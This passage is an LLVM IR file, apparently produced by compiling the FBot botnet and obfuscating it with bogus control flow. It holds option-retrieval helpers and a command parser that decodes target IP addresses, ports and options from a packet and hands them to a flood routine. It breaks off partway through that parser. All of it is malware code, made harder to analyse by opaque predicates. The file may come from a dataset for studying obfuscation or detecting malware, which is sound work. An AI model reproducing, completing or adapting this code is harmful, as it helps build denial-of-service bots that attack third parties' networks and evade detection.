; ModuleID = 'host/ir_bcf/FBot.a.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.command = type { i8, i8* (...)* }
%struct.option = type { i8, i16, i8* }
%struct.target = type { i32, i16 }
%struct.arguments = type { %struct.target*, %struct.option*, i8, i8, i16 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.timeval = type { i64, i64 }

@LOCAL_ADDRESS = common global i32 0, align 4
@command_list = common global [6 x %struct.command] zeroinitializer, align 16
@.str = private unnamed_addr constant [34 x i8] c"Sending SYN with ACK: %d SEQ: %d\0A\00", align 1
@.str.1 = private unnamed_addr constant [39 x i8] c"Received SYN-ACK with ACK: %d SEQ: %d\0A\00", align 1
@t = internal global i32 0, align 4
@p = internal global i32 0, align 4
@c = internal global i32 0, align 4
@f = internal global i32 0, align 4
@alpha_set = internal global [36 x i8] c"abcdefghijklmnopqrstuvwxyz0123456789", align 16
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define i8* @retrieve_opt_str(%struct.option*, i8 zeroext, i8 zeroext, i8*) #0 {
  %5 = load i32, i32* @x
  %6 = load i32, i32* @y
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca %struct.option*, align 8
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store %struct.option* %0, %struct.option** %13, align 8
  store i8 %1, i8* %14, align 1
  store i8 %2, i8* %15, align 1
  store i8* %3, i8** %16, align 8
  store i32 0, i32* %18, align 4
  %19 = load i8*, i8** %16, align 8
  store i8* %19, i8** %17, align 8
  store i32 0, i32* %18, align 4
  %20 = load i32, i32* @x
  %21 = load i32, i32* @y
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %28

; <label>:28:                                     ; preds = %52, %originalBBpart2
  %29 = load i32, i32* %18, align 4
  %30 = load i8, i8* %14, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp slt i32 %29, %31
  br i1 %32, label %33, label %55

; <label>:33:                                     ; preds = %28
  %34 = load %struct.option*, %struct.option** %13, align 8
  %35 = load i32, i32* %18, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds %struct.option, %struct.option* %34, i64 %36
  %38 = getelementptr inbounds %struct.option, %struct.option* %37, i32 0, i32 0
  %39 = load i8, i8* %38, align 8
  %40 = zext i8 %39 to i32
  %41 = load i8, i8* %15, align 1
  %42 = zext i8 %41 to i32
  %43 = icmp eq i32 %40, %42
  br i1 %43, label %44, label %51

; <label>:44:                                     ; preds = %33
  %45 = load %struct.option*, %struct.option** %13, align 8
  %46 = load i32, i32* %18, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.option, %struct.option* %45, i64 %47
  %49 = getelementptr inbounds %struct.option, %struct.option* %48, i32 0, i32 2
  %50 = load i8*, i8** %49, align 8
  store i8* %50, i8** %17, align 8
  br label %51

; <label>:51:                                     ; preds = %44, %33
  br label %52

; <label>:52:                                     ; preds = %51
  %53 = load i32, i32* %18, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %18, align 4
  br label %28

; <label>:55:                                     ; preds = %28
  %56 = load i8*, i8** %17, align 8
  ret i8* %56

originalBBalteredBB:                              ; preds = %originalBB, %4
  %57 = alloca %struct.option*, align 8
  %58 = alloca i8, align 1
  %59 = alloca i8, align 1
  %60 = alloca i8*, align 8
  %61 = alloca i8*, align 8
  %62 = alloca i32, align 4
  store %struct.option* %0, %struct.option** %57, align 8
  store i8 %1, i8* %58, align 1
  store i8 %2, i8* %59, align 1
  store i8* %3, i8** %60, align 8
  store i32 0, i32* %62, align 4
  %63 = load i8*, i8** %60, align 8
  store i8* %63, i8** %61, align 8
  store i32 0, i32* %62, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @retrieve_opt_num(%struct.option*, i8 zeroext, i8 zeroext, i16 zeroext) #0 {
  %5 = alloca %struct.option*, align 8
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i16, align 2
  %9 = alloca i16, align 2
  %10 = alloca i32, align 4
  store %struct.option* %0, %struct.option** %5, align 8
  store i8 %1, i8* %6, align 1
  store i8 %2, i8* %7, align 1
  store i16 %3, i16* %8, align 2
  store i16 0, i16* %9, align 2
  store i32 0, i32* %10, align 4
  %11 = load i16, i16* %8, align 2
  store i16 %11, i16* %9, align 2
  store i32 0, i32* %10, align 4
  br label %12

; <label>:12:                                     ; preds = %54, %4
  %13 = load i32, i32* @x.1
  %14 = load i32, i32* @y.2
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %12
  %21 = load i32, i32* %10, align 4
  %22 = load i8, i8* %6, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp slt i32 %21, %23
  %25 = load i32, i32* @x.1
  %26 = load i32, i32* @y.2
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %24, label %33, label %57

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load %struct.option*, %struct.option** %5, align 8
  %35 = load i32, i32* %10, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds %struct.option, %struct.option* %34, i64 %36
  %38 = getelementptr inbounds %struct.option, %struct.option* %37, i32 0, i32 0
  %39 = load i8, i8* %38, align 8
  %40 = zext i8 %39 to i32
  %41 = load i8, i8* %7, align 1
  %42 = zext i8 %41 to i32
  %43 = icmp eq i32 %40, %42
  br i1 %43, label %44, label %53

; <label>:44:                                     ; preds = %33
  %45 = load %struct.option*, %struct.option** %5, align 8
  %46 = load i32, i32* %10, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.option, %struct.option* %45, i64 %47
  %49 = getelementptr inbounds %struct.option, %struct.option* %48, i32 0, i32 2
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 @atoi(i8* %50) #7
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %9, align 2
  br label %53

; <label>:53:                                     ; preds = %44, %33
  br label %54

; <label>:54:                                     ; preds = %53
  %55 = load i32, i32* %10, align 4
  %56 = add nsw i32 %55, 1
  store i32 %56, i32* %10, align 4
  br label %12

; <label>:57:                                     ; preds = %originalBBpart2
  %58 = load i16, i16* %9, align 2
  ret i16 %58

originalBBalteredBB:                              ; preds = %originalBB, %12
  %59 = load i32, i32* %10, align 4
  %60 = load i8, i8* %6, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br label %originalBB
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @retrieve_opt_ipv4(%struct.option*, i8 zeroext, i8 zeroext, i32) #0 {
  %5 = load i32, i32* @x.3
  %6 = load i32, i32* @y.4
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca %struct.option*, align 8
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store %struct.option* %0, %struct.option** %13, align 8
  store i8 %1, i8* %14, align 1
  store i8 %2, i8* %15, align 1
  store i32 %3, i32* %16, align 4
  store i32 0, i32* %17, align 4
  store i32 0, i32* %18, align 4
  %19 = load i32, i32* %16, align 4
  store i32 %19, i32* %17, align 4
  store i32 0, i32* %18, align 4
  %20 = load i32, i32* @x.3
  %21 = load i32, i32* @y.4
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %28

; <label>:28:                                     ; preds = %101, %originalBBpart2
  %29 = load i32, i32* @x.3
  %30 = load i32, i32* @y.4
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %28
  %37 = load i32, i32* %18, align 4
  %38 = load i8, i8* %14, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp slt i32 %37, %39
  %41 = load i32, i32* @x.3
  %42 = load i32, i32* @y.4
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %40, label %49, label %104

; <label>:49:                                     ; preds = %originalBBpart24
  %50 = load i32, i32* @x.3
  %51 = load i32, i32* @y.4
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %49
  %58 = load %struct.option*, %struct.option** %13, align 8
  %59 = load i32, i32* %18, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds %struct.option, %struct.option* %58, i64 %60
  %62 = getelementptr inbounds %struct.option, %struct.option* %61, i32 0, i32 0
  %63 = load i8, i8* %62, align 8
  %64 = zext i8 %63 to i32
  %65 = load i8, i8* %15, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %64, %66
  %68 = load i32, i32* @x.3
  %69 = load i32, i32* @y.4
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %67, label %76, label %84

; <label>:76:                                     ; preds = %originalBBpart28
  %77 = load %struct.option*, %struct.option** %13, align 8
  %78 = load i32, i32* %18, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.option, %struct.option* %77, i64 %79
  %81 = getelementptr inbounds %struct.option, %struct.option* %80, i32 0, i32 2
  %82 = load i8*, i8** %81, align 8
  %83 = call i32 @inet_addr(i8* %82) #8
  store i32 %83, i32* %17, align 4
  br label %84

; <label>:84:                                     ; preds = %76, %originalBBpart28
  %85 = load i32, i32* @x.3
  %86 = load i32, i32* @y.4
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %84
  %93 = load i32, i32* @x.3
  %94 = load i32, i32* @y.4
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %101

; <label>:101:                                    ; preds = %originalBBpart212
  %102 = load i32, i32* %18, align 4
  %103 = add nsw i32 %102, 1
  store i32 %103, i32* %18, align 4
  br label %28

; <label>:104:                                    ; preds = %originalBBpart24
  %105 = load i32, i32* @x.3
  %106 = load i32, i32* @y.4
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %104
  %113 = load i32, i32* %17, align 4
  %114 = load i32, i32* @x.3
  %115 = load i32, i32* @y.4
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  ret i32 %113

originalBBalteredBB:                              ; preds = %originalBB, %4
  %122 = alloca %struct.option*, align 8
  %123 = alloca i8, align 1
  %124 = alloca i8, align 1
  %125 = alloca i32, align 4
  %126 = alloca i32, align 4
  %127 = alloca i32, align 4
  store %struct.option* %0, %struct.option** %122, align 8
  store i8 %1, i8* %123, align 1
  store i8 %2, i8* %124, align 1
  store i32 %3, i32* %125, align 4
  store i32 0, i32* %126, align 4
  store i32 0, i32* %127, align 4
  %128 = load i32, i32* %125, align 4
  store i32 %128, i32* %126, align 4
  store i32 0, i32* %127, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %28
  %129 = load i32, i32* %18, align 4
  %130 = load i8, i8* %14, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp slt i32 %129, %131
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %49
  %133 = load %struct.option*, %struct.option** %13, align 8
  %134 = load i32, i32* %18, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.option, %struct.option* %133, i64 %135
  %137 = getelementptr inbounds %struct.option, %struct.option* %136, i32 0, i32 0
  %138 = load i8, i8* %137, align 8
  %139 = zext i8 %138 to i32
  %140 = load i8, i8* %15, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %139, %141
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %84
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %104
  %143 = load i32, i32* %17, align 4
  br label %originalBB14
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @command_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca %struct.option*, align 8
  %8 = alloca %struct.target*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8, align 1
  %11 = alloca i16, align 2
  %12 = alloca i16, align 2
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i8 0, i8* %5, align 1
  store i8 0, i8* %6, align 1
  store %struct.option* null, %struct.option** %7, align 8
  store %struct.target* null, %struct.target** %8, align 8
  store i32 0, i32* %9, align 4
  store i8 0, i8* %10, align 1
  store i16 0, i16* %11, align 2
  %13 = load i8*, i8** %3, align 8
  %14 = load i8, i8* %13, align 1
  store i8 %14, i8* %5, align 1
  %15 = load i8*, i8** %3, align 8
  %16 = getelementptr inbounds i8, i8* %15, i64 1
  store i8* %16, i8** %3, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sext i32 %17 to i64
  %19 = sub i64 %18, 1
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* %4, align 4
  %21 = load i8*, i8** %3, align 8
  %22 = bitcast i8* %21 to i16*
  %23 = load i16, i16* %22, align 2
  store i16 %23, i16* %11, align 2
  %24 = load i16, i16* %11, align 2
  %25 = call zeroext i16 @ntohs(i16 zeroext %24) #9
  store i16 %25, i16* %11, align 2
  %26 = load i8*, i8** %3, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 2
  store i8* %27, i8** %3, align 8
  %28 = load i32, i32* %4, align 4
  %29 = sext i32 %28 to i64
  %30 = sub i64 %29, 2
  %31 = trunc i64 %30 to i32
  store i32 %31, i32* %4, align 4
  %32 = load i8*, i8** %3, align 8
  %33 = load i8, i8* %32, align 1
  store i8 %33, i8* %6, align 1
  %34 = load i8*, i8** %3, align 8
  %35 = getelementptr inbounds i8, i8* %34, i64 1
  store i8* %35, i8** %3, align 8
  %36 = load i32, i32* %4, align 4
  %37 = sext i32 %36 to i64
  %38 = sub i64 %37, 1
  %39 = trunc i64 %38 to i32
  store i32 %39, i32* %4, align 4
  %40 = load i8, i8* %6, align 1
  %41 = zext i8 %40 to i64
  %42 = call noalias i8* @calloc(i64 %41, i64 8) #8
  %43 = bitcast i8* %42 to %struct.target*
  store %struct.target* %43, %struct.target** %8, align 8
  %44 = load %struct.target*, %struct.target** %8, align 8
  %45 = icmp ne %struct.target* %44, null
  br i1 %45, label %47, label %46

; <label>:46:                                     ; preds = %2
  br label %268

; <label>:47:                                     ; preds = %2
  %48 = load i32, i32* @x.5
  %49 = load i32, i32* @y.6
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %47
  store i32 0, i32* %9, align 4
  %56 = load i32, i32* @x.5
  %57 = load i32, i32* @y.6
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %64

; <label>:64:                                     ; preds = %126, %originalBBpart2
  %65 = load i32, i32* %9, align 4
  %66 = load i8, i8* %6, align 1
  %67 = zext i8 %66 to i32
  %68 = icmp slt i32 %65, %67
  br i1 %68, label %69, label %129

; <label>:69:                                     ; preds = %64
  %70 = load i32, i32* @x.5
  %71 = load i32, i32* @y.6
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %69
  %78 = load i8*, i8** %3, align 8
  %79 = bitcast i8* %78 to i32*
  %80 = load i32, i32* %79, align 4
  %81 = load %struct.target*, %struct.target** %8, align 8
  %82 = load i32, i32* %9, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds %struct.target, %struct.target* %81, i64 %83
  %85 = getelementptr inbounds %struct.target, %struct.target* %84, i32 0, i32 0
  store i32 %80, i32* %85, align 4
  %86 = load i8*, i8** %3, align 8
  %87 = getelementptr inbounds i8, i8* %86, i64 4
  store i8* %87, i8** %3, align 8
  %88 = load i32, i32* %4, align 4
  %89 = sext i32 %88 to i64
  %90 = sub i64 %89, 4
  %91 = trunc i64 %90 to i32
  store i32 %91, i32* %4, align 4
  %92 = load i8*, i8** %3, align 8
  %93 = bitcast i8* %92 to i16*
  %94 = load i16, i16* %93, align 2
  %95 = load %struct.target*, %struct.target** %8, align 8
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.target, %struct.target* %95, i64 %97
  %99 = getelementptr inbounds %struct.target, %struct.target* %98, i32 0, i32 1
  store i16 %94, i16* %99, align 4
  %100 = load %struct.target*, %struct.target** %8, align 8
  %101 = load i32, i32* %9, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds %struct.target, %struct.target* %100, i64 %102
  %104 = getelementptr inbounds %struct.target, %struct.target* %103, i32 0, i32 1
  %105 = load i16, i16* %104, align 4
  %106 = call zeroext i16 @ntohs(i16 zeroext %105) #9
  %107 = load %struct.target*, %struct.target** %8, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.target, %struct.target* %107, i64 %109
  %111 = getelementptr inbounds %struct.target, %struct.target* %110, i32 0, i32 1
  store i16 %106, i16* %111, align 4
  %112 = load i8*, i8** %3, align 8
  %113 = getelementptr inbounds i8, i8* %112, i64 2
  store i8* %113, i8** %3, align 8
  %114 = load i32, i32* %4, align 4
  %115 = sext i32 %114 to i64
  %116 = sub i64 %115, 2
  %117 = trunc i64 %116 to i32
  store i32 %117, i32* %4, align 4
  %118 = load i32, i32* @x.5
  %119 = load i32, i32* @y.6
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart211, label %originalBB1alteredBB

originalBBpart211:                                ; preds = %originalBB1
  br label %126

; <label>:126:                                    ; preds = %originalBBpart211
  %127 = load i32, i32* %9, align 4
  %128 = add nsw i32 %127, 1
  store i32 %128, i32* %9, align 4
  br label %64

; <label>:129:                                    ; preds = %64
  %130 = load i32, i32* @x.5
  %131 = load i32, i32* @y.6
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %129
  %138 = load i8*, i8** %3, align 8
  %139 = load i8, i8* %138, align 1
  store i8 %139, i8* %10, align 1
  %140 = load i8*, i8** %3, align 8
  %141 = getelementptr inbounds i8, i8* %140, i64 1
  store i8* %141, i8** %3, align 8
  %142 = load i32, i32* %4, align 4
  %143 = sext i32 %142 to i64
  %144 = sub i64 %143, 1
  %145 = trunc i64 %144 to i32
  store i32 %145, i32* %4, align 4
  %146 = load i8, i8* %10, align 1
  %147 = zext i8 %146 to i32
  %148 = icmp eq i32 %147, 0
  %149 = load i32, i32* @x.5
  %150 = load i32, i32* @y.6
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart217, label %originalBB13alteredBB

originalBBpart217:                                ; preds = %originalBB13
  br i1 %148, label %157, label %164

; <label>:157:                                    ; preds = %originalBBpart217
  %158 = load i8, i8* %5, align 1
  %159 = load %struct.option*, %struct.option** %7, align 8
  %160 = load i8, i8* %10, align 1
  %161 = load %struct.target*, %struct.target** %8, align 8
  %162 = load i8, i8* %6, align 1
  %163 = load i16, i16* %11, align 2
  call void @command_flood(i8 zeroext %158, %struct.option* %159, i8 zeroext %160, %struct.target* %161, i8 zeroext %162, i16 zeroext %163)
  br label %268

; <label>:164:                                    ; preds = %originalBBpart217
  %165 = load i32, i32* @x.5
  %166 = load i32, i32* @y.6
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %164
  %173 = load i8, i8* %10, align 1
  %174 = zext i8 %173 to i64
  %175 = call noalias i8* @calloc(i64 %174, i64 16) #8
  %176 = bitcast i8* %175 to %struct.option*
  store %struct.option* %176, %struct.option** %7, align 8
  %177 = load %struct.option*, %struct.option** %7, align 8
  %178 = icmp ne %struct.option* %177, null
  %179 = load i32, i32* @x.5
  %180 = load i32, i32* @y.6
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br i1 %178, label %190, label %187

; <label>:187:                                    ; preds = %originalBBpart221
  %188 = load %struct.target*, %struct.target** %8, align 8
  %189 = bitcast %struct.target* %188 to i8*
  call void @free(i8* %189) #8
  br label %268

; <label>:190:                                    ; preds = %originalBBpart221
  store i32 0, i32* %9, align 4
  br label %191

; <label>:191:                                    ; preds = %258, %190
  %192 = load i32, i32* %9, align 4
  %193 = load i8, i8* %10, align 1
  %194 = zext i8 %193 to i32
  %195 = icmp slt i32 %192, %194
  br i1 %195, label %196, label %261

; <label>:196:                                    ; preds = %191
  store i16 0, i16* %12, align 2
  %197 = load i8*, i8** %3, align 8
  %198 = load i8, i8* %197, align 1
  %199 = load %struct.option*, %struct.option** %7, align 8
  %200 = load i32, i32* %9, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.option, %struct.option* %199, i64 %201
  %203 = getelementptr inbounds %struct.option, %struct.option* %202, i32 0, i32 0
  store i8 %198, i8* %203, align 8
  %204 = load i8*, i8** %3, align 8
  %205 = getelementptr inbounds i8, i8* %204, i64 1
  store i8* %205, i8** %3, align 8
  %206 = load i32, i32* %4, align 4
  %207 = sext i32 %206 to i64
  %208 = sub i64 %207, 1
  %209 = trunc i64 %208 to i32
  store i32 %209, i32* %4, align 4
  %210 = load i8*, i8** %3, align 8
  %211 = bitcast i8* %210 to i16*
  %212 = load i16, i16* %211, align 2
  store i16 %212, i16* %12, align 2
  %213 = load i16, i16* %12, align 2
  %214 = call zeroext i16 @ntohs(i16 zeroext %213) #9
  store i16 %214, i16* %12, align 2
  %215 = load i8*, i8** %3, align 8
  %216 = getelementptr inbounds i8, i8* %215, i64 2
  store i8* %216, i8** %3, align 8
  %217 = load i32, i32* %4, align 4
  %218 = sext i32 %217 to i64
  %219 = sub i64 %218, 2
  %220 = trunc i64 %219 to i32
  store i32 %220, i32* %4, align 4
  %221 = load i16, i16* %12, align 2
  %222 = zext i16 %221 to i32
  %223 = add nsw i32 %222, 1
  %224 = sext i32 %223 to i64
  %225 = call noalias i8* @malloc(i64 %224) #8
  %226 = load %struct.option*, %struct.option** %7, align 8
  %227 = load i32, i32* %9, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds %struct.option, %struct.option* %226, i64 %228
  %230 = getelementptr inbounds %struct.option, %struct.option* %229, i32 0, i32 2
  store i8* %225, i8** %230, align 8
  %231 = load %struct.option*, %struct.option** %7, align 8
  %232 = load i32, i32* %9, align 4
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds %struct.option, %struct.option* %231, i64 %233
  %235 = getelementptr inbounds %struct.option, %struct.option* %234, i32 0, i32 2
  %236 = load i8*, i8** %235, align 8
  %237 = load i8*, i8** %3, align 8
  %238 = load i16, i16* %12, align 2
  %239 = zext i16 %238 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %236, i8* %237, i64 %239, i32 1, i1 false)
  %240 = load %struct.option*, %struct.option** %7, align 8
  %241 = load i32, i32* %9, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.option, %struct.option* %240, i64 %242
  %244 = getelementptr inbounds %struct.option, %struct.option* %243, i32 0, i32 2
  %245 = load i8*, i8** %244, align 8
  %246 = load i16, i16* %12, align 2
  %247 = zext i16 %246 to i64
  %248 = getelementptr inbounds i8, i8* %245, i64 %247
  store i8 0, i8* %248, align 1
  %249 = load i16, i16* %12, align 2
  %250 = zext i16 %249 to i32
